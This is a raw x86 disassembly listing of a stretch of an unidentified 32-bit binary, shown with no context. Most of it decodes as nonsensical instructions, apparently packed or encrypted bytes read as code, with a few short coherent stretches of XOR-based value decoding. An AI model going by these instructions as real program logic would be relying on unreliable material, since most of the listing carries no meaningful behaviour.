  408184:	mov    edi,DWORD PTR [edi-0x496b6912]
  40818a:	xchg   ebp,eax
  40818b:	pop    ecx
  40818c:	lds    ebp,FWORD PTR [ebp-0x180ae2b3]
  408192:	icebp  
  408193:	inc    eax
  408194:	mov    edx,0xc7115f82
  408199:	mov    esi,ebp
  40819b:	add    al,0xfc
  40819d:	sahf   
  40819e:	hlt    
  40819f:	dec    edx
  4081a0:	ret    
  4081a1:	xchg   esi,eax
  4081a2:	popa   
  4081a3:	mov    eax,ds:0xebe2b0c8
  4081a8:	cwde   
  4081a9:	scas   al,BYTE PTR es:[edi]
  4081aa:	in     al,dx
  4081ab:	aad    0x79
  4081ad:	movzx  ecx,cl
  4081b0:	jne    0x4081b5
  4081b2:	lds    esp,FWORD PTR [edi]
  4081b4:	pop    ecx
  4081b5:	xor    eax,DWORD PTR [ebx]
  4081b7:	and    BYTE PTR [ebx+0x4c9fd394],ah
  4081bd:	sub    esi,edi
  4081bf:	mov    dl,0xe8
  4081c1:	int    0x89
  4081c3:	xor    al,0xab
  4081c5:	xchg   ebx,eax
  4081c6:	das    
  4081c7:	pop    esp
  4081c8:	daa    
  4081c9:	fdivrp st(7),st
  4081cb:	mov    ebp,0x86a2fde3
  4081d0:	mov    dh,0x3f
  4081d2:	shl    DWORD PTR [eax-0x76fbba73],cl
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	adc    DWORD PTR [ecx],0xd237d13c
  40826e:	jo     0x4082e0
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x40822f
  408275:	lahf   
  408276:	stc    
  408277:	push   esi
  408278:	jae    0x408205
  40827a:	fistp  QWORD PTR [edi-0x289eb5d9]
  408280:	and    DWORD PTR [si-0x6b],ebp
  408284:	stc    
  408285:	cld    
  408286:	das    
  408287:	add    ah,bl
  408289:	mov    edx,0x90761562
  40828e:	lods   eax,DWORD PTR ds:[esi]
  40828f:	add    al,0x88
  408291:	ret    0x9ae2
  408294:	aad    0xfc
  408296:	xchg   esp,eax
  408297:	arpl   WORD PTR [edx+edx*4-0x38],si
  40829b:	xchg   DWORD PTR [edx+0x4],esp
  40829e:	mov    bh,0x5c
  4082a0:	mov    bh,0xfa
  4082a2:	dec    esi
  4082a3:	inc    edi
  4082a4:	jns    0x40823f
  4082a6:	jns    0x40831a
  4082a8:	call   0xbaba6726
  4082ad:	pusha  
  4082ae:	(bad)  
  4082b0:	leave  
  4082b1:	sub    dl,ah
  4082b3:	cmp    ch,al
  4082b5:	inc    eax
  4082b6:	pop    ebp
  4082b7:	dec    ebp
  4082b8:	or     eax,0x1bcf4700
  4082bd:	push   ds
  4082be:	dec    esi
  4082bf:	gs icebp 
  4082c1:	jecxz  0x40830d
  4082c3:	sub    BYTE PTR ds:0xca13ff8b,dh
  4082c9:	scas   eax,DWORD PTR es:[edi]
  4082ca:	pop    ebp
  4082cb:	xchg   esp,eax
  4082cc:	add    al,0x5e
  4082ce:	push   es
  4082cf:	add    al,0x96
  4082d1:	mov    esp,0x1b4c6129
  4082d6:	adc    ah,BYTE PTR [ebp+0x33d489ee]
  4082dc:	lahf   
  4082dd:	loope  0x40834e
  4082df:	mul    BYTE PTR [ebp+0xa5291ac]
  4082e5:	jo     0x40835e
  4082e7:	xor    al,0x95
  4082e9:	push   cs
  4082ea:	push   ds
  4082eb:	and    BYTE PTR [ebx],cl
  4082ed:	ja     0x40833f
  4082ef:	in     al,dx
  4082f0:	dec    ebp
  4082f1:	lds    esi,FWORD PTR [ebx+0x77]
  4082f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082f5:	mov    esp,0x79092c34
  4082fa:	sub    esp,DWORD PTR [eax-0x46]
  4082fd:	jmp    0x1c73:0xd9f28a9b
  408304:	mov    edi,0xb544a13b
  408309:	shl    DWORD PTR [esi+eiz*4+0x45a79b03],1
  408310:	outs   dx,DWORD PTR ds:[esi]
  408311:	rcl    DWORD PTR [edi-0x21],0x9b
  408315:	adc    eax,0xd925dcb0
  40831a:	adc    al,0xd9
  40831c:	(bad)  
  40831d:	dec    esp
  40831e:	ror    BYTE PTR [ecx-0x14],1
  408321:	mov    eax,ds:0x1b3aa845
  408326:	jb     0x408377
  408328:	inc    esi
  408329:	(bad)  
  40832a:	jmp    0xe476:0x681e3cc1
  408331:	popa   
  408332:	in     al,0xab
  408334:	push   ds
  408335:	les    edi,FWORD PTR es:[eax-0x1c]
  408339:	dec    esi
  40833a:	inc    ebp
  40833b:	inc    ebp
  40833c:	xchg   ebp,eax
  40833d:	imul   ecx,DWORD PTR [ebx+0x20],0xffffffe4
  408341:	inc    esi
  408342:	stos   BYTE PTR es:[edi],al
  408343:	bound  edx,QWORD PTR [edi+0x3e]
  408346:	dec    esi
  408347:	icebp  
  408348:	loop   0x4083c5
  40834a:	mov    bl,0xb
  40834c:	(bad)  
  40834d:	adc    eax,0xeea401f8
  408352:	gs push ds
  408354:	scas   al,BYTE PTR es:[edi]
  408355:	data16 fbstp TBYTE PTR [ebx+edx*1-0x69]
  40835a:	mov    bl,0xf2
  40835c:	shr    BYTE PTR [eax],0xf0
  40835f:	test   al,0x5b
  408361:	mov    ah,0xba
  408363:	out    dx,al
  408364:	retf   
  408365:	test   al,0xee
  408367:	and    BYTE PTR ds:0x8cefbf7e,ch
  40836d:	dec    ecx
  40836e:	jns    0x4083e3
  408370:	iret   
  408371:	adc    ebp,DWORD PTR [eax]
  408373:	sub    BYTE PTR [ebx],dl
  408375:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  408377:	xchg   esi,eax
  408378:	out    0xac,al
  40837a:	loope  0x408391
  40837c:	sar    BYTE PTR [edx+0x33befa35],cl
  408382:	inc    ebp
  408383:	mov    al,0x7a
  408385:	pop    esi
  408386:	stc    
  408387:	into   
  408388:	inc    ebp
  408389:	jnp    0x4083e4
  40838b:	das    
  40838c:	imul   edi,eax,0x17346273
  408392:	(bad)  
  408393:	mov    bl,0xc9
  408395:	push   cs
  408396:	inc    ebp
  408397:	scas   eax,DWORD PTR es:[edi]
  408398:	or     al,0xc8
  40839a:	jne    0x4083bd
  40839c:	cmp    ebp,DWORD PTR [esi+ebp*1]
  40839f:	cmp    DWORD PTR [eax],ebx
  4083a1:	loopne 0x4083aa
  4083a3:	into   
  4083a4:	inc    ecx
  4083a5:	data16 cmp al,0x1b
  4083a8:	scas   eax,DWORD PTR es:[edi]
  4083a9:	es inc ecx
  4083ab:	jno    0x408378
  4083ad:	mov    ch,0xa3
  4083af:	mov    ds:0x458b61e3,eax
  4083b4:	faddp  st(6),st
  4083b6:	clc    
  4083b7:	cld    
  4083b8:	leave  
  4083b9:	sbb    dl,BYTE PTR [eax+0x7d2395fc]
  4083bf:	mov    dl,0xd8
  4083c1:	stos   BYTE PTR es:[edi],al
  4083c2:	lahf   
  4083c3:	bound  ebx,QWORD PTR [eax+0x6b]
  4083c6:	stos   BYTE PTR es:[edi],al
  4083c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083c9:	jne    0x40839d
  4083cb:	jo     0x408356
  4083cd:	dec    esi
  4083ce:	mov    ah,0xaf
  4083d0:	scas   eax,DWORD PTR es:[edi]
  4083d1:	ret    
  4083d2:	mul    edx
  4083d4:	add    BYTE PTR [eax-0x6e],bh
  4083d7:	mov    ds:0xe3397876,al
  4083dc:	scas   eax,DWORD PTR es:[edi]
  4083dd:	xor    BYTE PTR [eax-0x41fa4bd9],dh
  4083e3:	push   edi
  4083e4:	and    ebp,edx
  4083e6:	pusha  
  4083e7:	sub    al,0x1a
  4083e9:	sub    DWORD PTR [edx-0x2b],0x21
  4083ed:	dec    eax
  4083ee:	push   ss
  4083ef:	std    
  4083f0:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4083f2:	mov    ah,0x7d
  4083f4:	test   BYTE PTR [ebp+0x1],al
  4083f7:	add    DWORD PTR [esi+0x6f],edi
  4083fa:	ror    BYTE PTR ds:0xdcc92bc,1
  408400:	out    dx,eax
  408401:	mov    dh,BYTE PTR [eax]
  408403:	and    BYTE PTR [ecx-0xcd77141],dl
  408409:	stos   BYTE PTR es:[edi],al
  40840a:	jle    0x4083c0
  40840c:	lahf   
  40840d:	out    dx,eax
  40840e:	pop    eax
  40840f:	cmp    eax,0x169b0fe5
  408414:	jle    0x4083c6
  408416:	leave  
  408417:	call   0xbfb0:0x8bb45ed6
  40841e:	rol    BYTE PTR [ebp-0x788d7ab8],0x80
  408425:	adc    ebp,ecx
  408427:	(bad)  [esi+ebp*4-0x6aaea1ec]
  40842e:	sub    DWORD PTR [ebx+0x54cb3ed5],esp
  408434:	popa   
  408435:	jmp    0x4084a1
  408437:	in     al,dx
  408438:	in     al,dx
  408439:	xchg   dh,cl
  40843b:	jl     0x408427
  40843d:	out    dx,al
  40843e:	lock xchg ebp,eax
  408440:	(bad)  
  408441:	enter  0xbae2,0xda
  408445:	sub    BYTE PTR [esi-0x49],dh
  408448:	mov    WORD PTR [edx+0x65],fs
  40844b:	mov    cl,0x70
  40844d:	adc    eax,esp
  40844f:	jnp    0x4084a0
  408451:	sbb    bl,ah
  408453:	fdivr  DWORD PTR [edx+0x6]
  408456:	popfw  
  408458:	cmp    ebx,DWORD PTR [ebx-0x7b]
  40845b:	arpl   WORD PTR [esi+0x1c6a82b1],bp
  408461:	adc    al,0x6e
  408463:	repnz lods al,BYTE PTR ds:[esi]
  408465:	pop    edx
  408466:	jge    0x40841b
  408468:	call   FWORD PTR [ecx+0x12e943e9]
  40846e:	clc    
  40846f:	(bad)  
  408470:	outs   dx,DWORD PTR ds:[esi]
  408471:	cwde   
  408472:	sub    BYTE PTR [ebp+0x8],bl
  408475:	inc    ebp
  408476:	fwait
  408477:	or     al,0xe8
  408479:	xchg   DWORD PTR [esp+edx*4-0x6d],esi
  40847d:	out    dx,al
  40847e:	jecxz  0x4084f9
  408480:	aad    0x55
  408482:	loope  0x4084b6
  408484:	ret    
  408485:	or     cl,ah
  408487:	push   cs
  408488:	xchg   edi,eax
  408489:	inc    esi
  40848a:	fisub  WORD PTR [edi+0x6f08fa4c]
  408490:	mov    esp,0x485e68a1
  408495:	inc    edi
  408496:	sar    DWORD PTR [edx],1
  408498:	in     eax,0x7f
  40849a:	adc    eax,0xcf1b07d7
  40849f:	into   
  4084a0:	les    ebx,FWORD PTR [edi+0x1f]
  4084a3:	add    edi,DWORD PTR [esi-0x44]
  4084a6:	mov    edi,0xf6d73f8d
  4084ab:	inc    esp
  4084ac:	mov    al,ds:0xb0ed1064
  4084b1:	push   edi
  4084b2:	repz imul eax,DWORD PTR [edx+0x8f54b6f],0xfffffffa
  4084ba:	je     0x4084d6
  4084bc:	mov    bh,0xbe
  4084be:	jp     0x4084c8
  4084c0:	into   
  4084c1:	and    esi,DWORD PTR [eax]
  4084c3:	push   ds
  4084c4:	(bad)  
  4084c5:	sbb    eax,0x530a643e
  4084ca:	xor    ecx,DWORD PTR [edi-0x6e]
  4084cd:	cmp    BYTE PTR [ebx],0x36
  4084d0:	icebp  
  4084d1:	stos   BYTE PTR es:[edi],al
  4084d2:	cmp    bl,bh
  4084d4:	lea    ecx,[edi+0x6f]
  4084d7:	add    BYTE PTR ds:0x55a09877,ah
  4084de:	adc    ah,bh
  4084e0:	push   0xffffff8d
  4084e2:	minps  xmm3,XMMWORD PTR [ebp-0x36]
  4084e6:	ins    BYTE PTR es:[edi],dx
  4084e7:	inc    esi
  4084e8:	lds    ebp,FWORD PTR [edx]
  4084ea:	push   edx
  4084eb:	setne  BYTE PTR [eax+0x1e]
  4084ef:	out    dx,al
  4084f0:	xor    DWORD PTR [edi+0x31],esp
  4084f3:	dec    esp
  4084f4:	mov    eax,0x5fedcaa7
  4084f9:	sbb    al,0x78
  4084fb:	call   0x5e3fd1d8
  408500:	je     0x408572
  408502:	test   al,0x5a
  408504:	lahf   
  408505:	inc    ecx
  408506:	test   DWORD PTR [edx+0x9e048b5],esi
  40850c:	cwde   
  40850d:	cmp    ah,BYTE PTR ds:0x6ba0cb93
  408513:	stos   DWORD PTR es:[edi],eax
  408514:	cld    
  408515:	int    0x1
  408517:	into   
  408518:	fnsave [eax+0x7e]
  40851b:	in     eax,dx
  40851c:	dec    eax
  40851d:	sub    esi,ecx
  40851f:	leave  
  408520:	xchg   esi,eax
  408521:	enter  0x2738,0x7f
  408525:	bound  ebx,QWORD PTR [ebx+0x10b6430d]
  40852b:	imul   edx,ecx,0x1b815f99
  408531:	xor    BYTE PTR [eax+0x62],0xe2
  408535:	push   cs
  408536:	add    ebp,esi
  408538:	add    edx,DWORD PTR [ecx+0x4fc6bc68]
  40853e:	cmp    edi,esp
  408540:	out    0x20,eax
  408542:	iret   
  408543:	xchg   ebp,eax
  408544:	add    dh,BYTE PTR [ebx+0xa]
  408547:	mov    ebx,0x9ca68bb1
  40854c:	lock inc esp
  40854e:	jp     0x40856b
  408550:	ret    0x9489
  408553:	dec    edi
  408554:	scas   eax,DWORD PTR es:[edi]
  408555:	aaa    
  408556:	xchg   ecx,eax
  408557:	cmp    bl,ah
  408559:	sbb    al,0x8
  40855b:	pop    ecx
  40855c:	sub    eax,0xfdc22c2c
  408561:	add    BYTE PTR [eax-0x60c790e0],ah
  408567:	(bad)  
  408568:	xchg   ecx,eax
  408569:	mov    eax,0xc96a3100
  40856e:	call   0x6264:0xc6c393f5
  408575:	jmp    0x4085ea
  408577:	imul   edi,DWORD PTR [ecx-0x557cfcb5],0xbfaf7e96
  408581:	push   ebp
  408582:	shl    ch,1
  408584:	cmp    ebx,esp
  408586:	adc    al,0x66
  408588:	xor    al,BYTE PTR [ebx]
  40858a:	or     eax,0x22b32758
  40858f:	add    al,0xce
  408591:	mov    al,0x66
  408593:	xchg   ebx,eax
  408594:	repnz push edi
  408596:	cdq    
  408597:	xor    DWORD PTR ds:0x8418a641,esi
  40859d:	pop    edx
  40859e:	inc    eax
  40859f:	or     al,0xb6
  4085a1:	inc    eax
  4085a2:	cli    
  4085a3:	mov    cl,BYTE PTR [eax+0x348e901]
  4085a9:	add    BYTE PTR [eax],al
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x72794ab7
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x408628
  4085c4:	daa    
  4085c5:	icebp  
  4085c6:	cmp    eax,0x41897ce0
  4085cb:	mov    ebx,0xa3f88697
  4085d0:	xchg   DWORD PTR [ebx],eax
  4085d2:	rcl    DWORD PTR [ebp+0x143e12b9],0x3d
  4085d9:	lock dec esi
  4085db:	dec    edi
  4085dc:	mov    DWORD PTR [esi],ebx
  4085de:	cwde   
  4085df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085e0:	je     0x408570
  4085e2:	js     0x408623
  4085e4:	inc    esp
  4085e5:	xor    BYTE PTR [eax+0x15514460],bl
  4085eb:	or     ecx,ecx
  4085ed:	test   BYTE PTR ds:0x655e22ce,dl
  4085f3:	push   ds
  4085f4:	ins    BYTE PTR es:[edi],dx
  4085f5:	push   edx
  4085f6:	pop    ecx
  4085f7:	adc    ah,BYTE PTR [edx]
  4085f9:	ins    BYTE PTR es:[edi],dx
  4085fa:	leave  
  4085fb:	arpl   WORD PTR [edi],sp
  4085fd:	or     eax,DWORD PTR [ebp-0x26]
  408600:	add    esi,edx
  408602:	in     eax,dx
  408603:	push   cs
  408604:	sbb    al,0x3
  408606:	mov    al,ds:0xa461afc3
  40860b:	leave  
  40860c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40860d:	int    0xb2
  40860f:	xor    ah,BYTE PTR [eax+0x2e]
  408612:	je     0x4085ab
  408614:	add    ecx,DWORD PTR [esi+0x6b]
  408617:	fistp  QWORD PTR [ebx-0x56]
  40861a:	adc    ax,0xe1f2
  40861e:	fwait
  40861f:	inc    ecx
  408620:	xchg   ecx,eax
  408621:	ins    BYTE PTR es:[edi],dx
  408622:	xchg   DWORD PTR [ecx-0x28859d16],edi
  408628:	or     BYTE PTR [edi-0x36cf8deb],0x8b
  40862f:	mov    ecx,0xb02cb8d0
  408634:	dec    esp
  408635:	jae    0x4086a9
  408637:	dec    ebx
  408638:	mov    ch,0x97
  40863a:	repnz (bad) 
  40863c:	xchg   ecx,eax
  40863d:	xor    al,0x4b
  40863f:	stos   BYTE PTR es:[edi],al
  408640:	inc    edi
  408641:	pop    edi
  408642:	dec    esi
  408643:	fidiv  DWORD PTR [edx]
  408645:	and    DWORD PTR [ebx+ecx*2+0x6938d469],eax
  40864c:	retf   0xf0b1
  40864f:	sar    DWORD PTR [edx-0x143f8691],cl
  408655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408656:	bound  esi,QWORD PTR [eax-0x3278c85a]
  40865c:	ret    
  40865d:	add    dh,ah
  40865f:	imul   esi,DWORD PTR [eax+eax*4+0x3deafcbb],0xffffff8e
  408667:	cli    
  408668:	(bad)  
  408669:	scas   al,BYTE PTR es:[edi]
  40866a:	nop
  40866b:	sub    eax,ecx
  40866d:	outs   dx,DWORD PTR ds:[esi]
  40866e:	dec    eax
  40866f:	mov    BYTE PTR [ebp-0x6664eec8],al
  408675:	xchg   esi,eax
  408676:	outs   dx,DWORD PTR ds:[esi]
  408677:	mov    ecx,0xd7f0e1b4
  40867c:	dec    edi
  40867d:	xor    DWORD PTR [ebx-0x51],ebx
  408680:	dec    ch
  408682:	add    eax,0x2f3d1f37
  408687:	addr16 xor al,0xe1
  40868a:	xchg   edi,eax
  40868b:	dec    esi
  40868c:	fisttp QWORD PTR [ebx+0x272c0c81]
  408692:	add    eax,0xcbcc01cb
  408697:	cmp    al,0xd7
  408699:	mov    ecx,0x94dbcf48
  40869e:	sbb    DWORD PTR [esp+eiz*2],0xe0ee3616
  4086a5:	hlt    
  4086a6:	mov    edi,0xda7d9b5d
  4086ab:	jecxz  0x4086fe
  4086ad:	stos   BYTE PTR es:[edi],al
  4086ae:	push   ebx
  4086af:	int    0xbf
  4086b1:	xchg   ecx,eax
  4086b2:	dec    esi
  4086b3:	or     eax,0x3e243ae6
  4086b8:	push   esp
  4086b9:	inc    edx
  4086ba:	mov    ds:0xcfdd2152,eax
  4086bf:	jmp    0x3c869c4
  4086c4:	pusha  
  4086c5:	or     al,0xf6
  4086c7:	mov    al,ds:0xd5e4ee4
  4086cc:	push   ebx
  4086cd:	pop    esi
  4086ce:	stos   BYTE PTR es:[edi],al
  4086cf:	fistp  WORD PTR [esi-0x76]
  4086d2:	lods   eax,DWORD PTR ds:[esi]
  4086d3:	push   ss
  4086d4:	loopne 0x4086da
  4086d6:	xlat   BYTE PTR ds:[ebx]
  4086d7:	xor    bh,bh
  4086d9:	(bad)  
  4086da:	fwait
  4086db:	imul   DWORD PTR [ebx]
  4086dd:	cmc    
  4086de:	xchg   ecx,eax
  4086df:	xchg   esi,eax
  4086e0:	dec    esi
  4086e1:	inc    eax
  4086e2:	int3   
  4086e3:	imul   ebx,ebx,0xfffffff8
  4086e6:	(bad)  
  4086e7:	int    0x2c
  4086e9:	pop    ecx
  4086ea:	hlt    
  4086eb:	stos   BYTE PTR es:[edi],al
  4086ec:	jg     0x40868c
  4086ee:	(bad)  
  4086f0:	mov    al,ds:0x79fb38eb
  4086f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086f6:	loope  0x408763
  4086f8:	adc    dl,BYTE PTR [esp+ecx*2]
  4086fb:	fbstp  TBYTE PTR [ecx]
  4086fd:	loop   0x40873a
  4086ff:	pop    edx
  408700:	nop
  408701:	js     0x4086ea
  408703:	int3   
  408704:	ja     0x4086eb
  408706:	repnz leave 
  408708:	repnz pop ecx
  40870a:	test   DWORD PTR [edx+edx*2-0x223e5774],ebx
  408711:	fnstsw WORD PTR [edx+edi*4+0x7ce6ad14]
  408718:	call   FWORD PTR [edi-0x254bf362]
  40871e:	sub    eax,0x49e195b2
  408723:	push   eax
  408724:	test   edx,ecx
  408726:	lock jne 0x408703
  408729:	mov    fs,WORD PTR [eax+0x4e878cab]
  40872f:	sub    BYTE PTR [ebx+0x37],dh
  408732:	lea    ebx,[eax+0x56e7cd59]
  408738:	test   al,0xbf
  40873a:	ja     0x408730
  40873c:	out    dx,al
  40873d:	les    edi,FWORD PTR fs:[ebx+eax*4-0x37]
  408742:	and    dl,ch
  408744:	fnstsw WORD PTR [esi]
  408746:	mov    eax,ds:0xdd5020ac
  40874b:	test   BYTE PTR [ecx-0x22b8f6c6],0xa
  408752:	clc    
  408753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408754:	mov    eax,0x22b36818
  408759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40875a:	jl     0x408775
  40875c:	rcl    dh,1
  40875e:	push   ebp
  40875f:	ret    
  408760:	aas    
  408761:	inc    edi
  408762:	(bad)
  408766:	mov    al,0xd
  408768:	sub    dh,BYTE PTR [esi+0x65]
  40876b:	mov    eax,ds:0x11c8d45a
  408770:	fisub  DWORD PTR [esi-0x501d6f6b]
  408776:	out    0x50,eax
  408778:	jbe    0x4087ad
  40877a:	lods   al,BYTE PTR ds:[esi]
  40877b:	dec    edx
  40877c:	add    BYTE PTR [ebx*8+0x18278a12],ah
  408783:	mov    ebx,0x51470319
  408788:	sar    DWORD PTR [ecx],1
  40878a:	adc    edi,ecx
  40878c:	xor    BYTE PTR [ebx-0x5bb65343],0x5e
  408793:	dec    ebp
  408794:	pop    ebx
  408795:	jmp    0xc774:0xb81012e4
  40879c:	inc    ebx
  40879d:	cwde   
  40879e:	dec    ecx
  40879f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087a0:	cdq    
  4087a1:	sbb    al,0x8e
  4087a3:	adc    al,0x18
  4087a5:	cs xor al,0x9a
  4087a8:	imul   esi,esp,0x3f
  4087ab:	nop
  4087ac:	mov    ebx,0x53c67d8b
  4087b1:	push   ds
  4087b2:	and    esp,DWORD PTR ss:[edi+0x70]
  4087b6:	ss and al,0x82
  4087b9:	dec    esi
  4087ba:	xchg   ebp,eax
  4087bb:	sbb    cl,dl
  4087bd:	and    al,0x1a
  4087bf:	clc    
  4087c0:	mov    dl,0xa0
  4087c2:	outs   dx,DWORD PTR ds:[esi]
  4087c3:	add    ah,cl
  4087c5:	enter  0x4e18,0xc8
  4087c9:	pop    es
  4087ca:	mov    edx,0x35298fb
  4087cf:	dec    ebx
  4087d0:	sbb    ah,al
  4087d2:	mov    ds:0x68ff22db,eax
  4087d7:	add    dl,ah
  4087d9:	mov    esp,DWORD PTR [edx+0x2a]
  4087dc:	jge    0x408803
  4087de:	cmp    DWORD PTR [ebx],ecx
  4087e0:	aad    0x3b
  4087e2:	pop    edi
  4087e3:	cmp    eax,DWORD PTR [edi+edi*1+0x1e1aa13e]
  4087ea:	fld    DWORD PTR [ecx]
  4087ec:	(bad)  
  4087ed:	das    
  4087ee:	ins    BYTE PTR es:[edi],dx
  4087ef:	mov    esi,0xdaee68ad
  4087f4:	push   0xbc665a81
  4087f9:	cmc    
  4087fa:	int3   
  4087fb:	or     DWORD PTR [eax+0x73e5c94f],0xffffffc8
  408802:	push   ecx
  408803:	sahf   
  408804:	sub    DWORD PTR [ecx-0x36],ecx
  408807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408808:	sbb    ax,WORD PTR [ebx]
  40880b:	pop    ecx
  40880c:	xor    al,0xd2
  40880e:	inc    edx
  40880f:	pop    ds
  408810:	mov    DWORD PTR [esi-0x6b874fa7],edi
  408816:	mov    bl,0x5d
  408818:	jno    0x408857
  40881a:	cmp    cl,al
  40881c:	mov    al,ds:0xd995c493
  408821:	lods   eax,DWORD PTR ds:[esi]
  408822:	test   BYTE PTR [esi+0x28fdd45a],ch
  408828:	fist   WORD PTR [ecx+0x77]
  40882b:	add    eax,0x7278220e
  408830:	inc    edi
  408831:	icebp  
  408832:	push   es
  408833:	xor    BYTE PTR [edi],0xc2
  408836:	cmp    al,0x36
  408838:	jns    0x408818
  40883a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40883b:	push   esp
  40883c:	das    
  40883d:	or     BYTE PTR [edi-0x5012cf41],dl
  408843:	push   esp
  408844:	or     DWORD PTR [ecx],ebp
  408846:	cdq    
  408847:	shr    DWORD PTR [ecx-0x575cbd15],0x71
  40884e:	mov    DWORD PTR [eax-0x25],ebp
  408851:	in     al,dx
  408852:	xchg   esp,eax
  408853:	ror    BYTE PTR [eax],cl
  408855:	test   BYTE PTR [ebx-0x2e7b44a7],0x39
  40885c:	jp     0x40886d
  40885e:	adc    ebp,DWORD PTR [ecx]
  408860:	enterw 0x3b8b,0xa0
  408865:	retf   
  408866:	stc    
  408867:	jns    0x408898
  408869:	xor    eax,0xe6e06e90
  40886e:	cmp    eax,0x83ca9d6e
  408873:	xlat   BYTE PTR ds:[ebx]
  408874:	outs   dx,DWORD PTR ds:[esi]
  408875:	rcl    BYTE PTR [eax+ecx*8],cl
  408878:	mov    ebp,0x8b2cfeed
  40887d:	imul   BYTE PTR [ecx]
  40887f:	popf   
  408880:	pop    eax
  408881:	sub    bh,BYTE PTR [ebp-0x12fc941b]
  408887:	ins    DWORD PTR es:[edi],dx
  408888:	mov    ah,0x2e
  40888a:	fisttp QWORD PTR [ebp-0x58]
  40888d:	ficom  DWORD PTR [ecx+0x21]
  408890:	push   ebx
  408891:	out    dx,eax
  408892:	aas    
  408893:	sub    ebx,eax
  408895:	push   ebx
  408896:	dec    esp
  408897:	sub    eax,esp
  408899:	repz adc dh,al
  40889c:	lods   eax,DWORD PTR ds:[esi]
  40889d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40889e:	retf   
  40889f:	pop    esi
  4088a0:	dec    ebp
  4088a1:	mov    ch,0x24
  4088a3:	xchg   BYTE PTR [edi],ch
  4088a5:	fnstcw WORD PTR [edi-0x34]
  4088a8:	sbb    al,0xb6
  4088aa:	mov    dh,0x65
  4088ac:	mov    cl,0x62
  4088ae:	call   0xaab044fc
  4088b3:	loop   0x4088f1
  4088b5:	inc    ebp
  4088b6:	xchg   dl,bl
  4088b8:	pushf  
  4088b9:	outs   dx,DWORD PTR ds:[esi]
  4088ba:	sbb    edi,DWORD PTR [ebx+eax*8-0x5ac7e936]
  4088c1:	popa   
  4088c2:	or     ebp,DWORD PTR [esi-0x1e]
  4088c5:	sbb    al,0xd3
  4088c7:	cli    
  4088c8:	cmp    eax,0x76037a89
  4088cd:	iret   
  4088ce:	xor    eax,0x27de1a1b
  4088d3:	mov    ds:0x316732c8,al
  4088d8:	popf   
  4088d9:	test   al,0x20
  4088db:	out    0x4a,al
  4088dd:	adc    eax,eax
  4088df:	scas   al,BYTE PTR es:[edi]
  4088e0:	ins    BYTE PTR es:[edi],dx
  4088e1:	(bad)  
  4088e2:	fucomp st(1)
  4088e4:	retf   
  4088e5:	aaa    
  4088e6:	and    al,0x2
  4088e8:	nop
  4088e9:	and    bl,BYTE PTR [eax+0x4e]
  4088ec:	pusha  
  4088ed:	or     al,0x91
  4088ef:	out    0x6,al
  4088f1:	and    ebp,ecx
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x1b435cff],cl
  40890c:	sbb    dh,ch
  40890e:	and    DWORD PTR [edi+0x207070dc],edx
  408914:	jge    0x408986
  408916:	jo     0x40889b
  408918:	int    0x70
  40891a:	retf   0xc661
  40891d:	push   ebx
